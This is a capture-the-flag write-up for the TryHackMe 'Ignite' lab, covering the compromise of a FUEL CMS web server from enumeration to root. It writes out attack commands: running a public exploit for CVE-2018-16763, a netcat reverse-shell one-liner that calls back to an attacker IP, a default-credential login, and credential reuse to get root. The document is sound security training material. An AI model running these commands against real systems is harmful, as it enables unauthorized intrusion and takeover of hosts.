# TryHackMe – Ignite

## Scope

Target IP: 10.67.184.42
Objective: Obtain user and root access through remote exploitation and
privilege escalation.

## Initial Enumeration

A full TCP scan with service and version detection was performed.

nmap -sC -sV -O -T4 10.67.184.42

Key Findings

-   Port 80/tcp open
-   Apache 2.4.18 (Ubuntu)
-   HTTP title: Welcome to FUEL CMS
-   robots.txt revealed disallowed entry: /fuel/

Only one exposed service significantly reduced the attack surface and
directed focus to the web application.

## Web Enumeration

Accessing:

http://10.67.184.42

The landing page confirmed the application was running FUEL CMS.

Navigating to:

http://10.67.184.42/fuel

The login page indicated default credentials:

admin / admin

Authentication was successful, granting full administrative access to
the CMS dashboard.

Observations Inside CMS

-   Access to content management sections
-   “Blocks” section with create and upload functionality
-   Full administrative privileges confirmed

A file upload attack was considered at this stage. However, before
testing upload-based execution, the application version was investigated
for known vulnerabilities.

## Vulnerability Identification

Search for public exploits:

searchsploit fuel cms

Relevant exploit discovered:

CVE-2018-16763 – Fuel CMS 1.4.x Remote Code Execution

Exploit copied locally:

searchsploit -m php/webapps/50477.py

This vulnerability allows remote command execution via crafted requests.

Given the presence of a reliable RCE, this path was prioritized over
manual upload exploitation.

## Remote Code Execution

Exploit execution:

python3 50477.py -u http://10.67.184.42

Command execution validated:

Enter Command $ id uid=33(www-data) gid=33(www-data) groups=33(www-data)

Remote code execution confirmed as www-data.

## Reverse Shell Establishment

Listener on attacker machine:

nc -lvnp 4444

Reverse shell payload executed on target:

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc
192.168.176.64 4444 > /tmp/f

Shell Stabilization

python3 -c ‘import pty; pty.spawn(“/bin/bash”)’ export TERM=xterm stty
rows 40 columns 120

Stable interactive shell achieved.

## Local Enumeration

Identity verification:

whoami id

Directory inspection:

ls -la / ls -la /home ls -la /home/www-data

User flag located in:

/home/www-data/flag.txt

Flag value redacted.

## Privilege Escalation

Fuel CMS configuration file located at:

/var/www/html/fuel/application/config/database.php

Inspection:

cat /var/www/html/fuel/application/config/database.php

Credentials discovered:

-   Database user: root
-   Password: (redacted by GL)

Credential reuse attempt:

su root

Root password entered: (redacted by GL)

Privilege escalation successful.

Verification:

id

Confirmed root privileges.

Root flag located in:

/root/root.txt

(Flag value redacted by GL)



## Attack Chain Summary

1.  Service enumeration identified Apache and Fuel CMS
2.  Default credentials provided administrative access
3.  Public RCE (CVE-2018-16763) identified and exploited
4.  Reverse shell established
5.  Configuration file enumeration exposed credentials
6.  Credential reuse enabled root access

## Lessons learnt

-   Structured enumeration reduces unnecessary attack attempts
-   Default credentials remain a critical weakness
-   Public CVEs should be prioritized over speculative exploitation
-   Also learnt to export them locally and deploy them
-   Configuration files frequently contain sensitive credentials
-   Credential reuse is a common real-world escalation vector

